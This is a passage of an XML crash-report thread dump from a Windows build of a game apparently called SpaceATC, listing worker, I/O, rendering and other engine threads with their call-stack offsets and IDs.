				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f465da SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f2f4d0 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0f64 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>22944</ThreadID>
				<ThreadName>Background Worker #5</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f465da SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f2f4d0 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0f64 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>3960</ThreadID>
				<ThreadName>Background Worker #6</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f465da SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f2f4d0 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0f64 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>34788</ThreadID>
				<ThreadName>Background Worker #7</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f465da SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f2f4d0 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0f64 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>21388</ThreadID>
				<ThreadName>Background Worker #8</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f465da SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f2f4d0 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0f64 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>36276</ThreadID>
				<ThreadName>Background Worker #9</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f465da SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f2f4d0 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0f64 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>22164</ThreadID>
				<ThreadName>Background Worker #10</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f465da SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f2f4d0 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0f64 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>30940</ThreadID>
				<ThreadName>Background Worker #11</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f465da SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f2f4d0 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0f64 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>34912</ThreadID>
				<ThreadName>Background Worker #12</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f465da SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f2f4d0 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0f64 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>22436</ThreadID>
				<ThreadName>Background Worker #13</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f465da SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f2f4d0 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0f64 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>14764</ThreadID>
				<ThreadName>Background Worker #14</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f465da SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f2f4d0 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0f64 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>29964</ThreadID>
				<ThreadName>Background Worker #15</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f465da SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f2f4d0 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0f64 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>36028</ThreadID>
				<ThreadName>Background Worker #16</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f465da SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f2f4d0 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0f64 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>33772</ThreadID>
				<ThreadName>Background Worker #17</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f465da SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f2f4d0 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0f64 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>38012</ThreadID>
				<ThreadName>Background Worker #18</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f465da SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f2f4d0 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0f64 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>36572</ThreadID>
				<ThreadName>Background Worker #19</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f465da SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f2f4d0 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0f64 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>28504</ThreadID>
				<ThreadName>Background Worker #20</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f465da SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f2f4d0 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0f64 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>6312</ThreadID>
				<ThreadName>Background Worker #21</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f465da SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f2f4d0 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0f64 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>10548</ThreadID>
				<ThreadName>Background Worker #22</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f465da SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f2f4d0 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0f64 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>32116</ThreadID>
				<ThreadName>Background Worker #23</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f465da SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f2f4d0 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0f64 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>34960</ThreadID>
				<ThreadName>Background Worker #24</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f465da SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f2f4d0 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0f64 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>2680</ThreadID>
				<ThreadName>Background Worker #25</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f465da SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f2f4d0 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0f64 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>34656</ThreadID>
				<ThreadName>Background Worker #26</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f465da SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f2f4d0 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0f64 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>10364</ThreadID>
				<ThreadName>Background Worker #27</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f465da SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f2f4d0 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0f64 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>22480</ThreadID>
				<ThreadName>Background Worker #28</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f465da SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f2f4d0 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0f64 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>9036</ThreadID>
				<ThreadName>Background Worker #29</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0d6e SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>2352</ThreadID>
				<ThreadName>BackgroundThreadPool #0</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0d6e SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>21000</ThreadID>
				<ThreadName>BackgroundThreadPool #1</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15fe74 ntdll 0x00007ffc3d760000 + daaa4 KERNELBASE 0x00007ffc3ac50000 + 6a911 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0ed1 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>9344</ThreadID>
				<ThreadName>FHeartBeatThread</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 30875dc SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>33224</ThreadID>
				<ThreadName>FMediaTicker</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15fe74 ntdll 0x00007ffc3d760000 + daaa4 KERNELBASE 0x00007ffc3ac50000 + 6a911 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 16db363 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>36760</ThreadID>
				<ThreadName>HttpManagerThread</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 3d72de6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>33464</ThreadID>
				<ThreadName>OnlineAsyncTaskThreadSteam DefaultInstance</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 163444 ntdll 0x00007ffc3d760000 + fde5 KERNELBASE 0x00007ffc3ac50000 + e5ea8 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 103753c SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f4539f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f451dc SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10894a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0f64 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>32608</ThreadID>
				<ThreadName>OutputDeviceRedirector</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0d6e SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>34420</ThreadID>
				<ThreadName>IOThreadPool #0</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0d6e SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>27092</ThreadID>
				<ThreadName>IOThreadPool #1</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0d6e SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>38872</ThreadID>
				<ThreadName>IOThreadPool #2</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0d6e SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>32364</ThreadID>
				<ThreadName>IOThreadPool #3</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 1f431d2 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>4004</ThreadID>
				<ThreadName>IoService</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 101a092 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>36364</ThreadID>
				<ThreadName>IoDispatcher</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 28a9435 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>35776</ThreadID>
				<ThreadName>RHIInterruptThread</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 28a9435 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>34324</ThreadID>
				<ThreadName>RHISubmissionThread</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f3f2ab SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 2a59e3b SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>36008</ThreadID>
				<ThreadName>RHIThread</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + f3f2ab SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 2a59831 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 2a59e97 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>30980</ThreadID>
				<ThreadName>RenderThread 0</ThreadName>
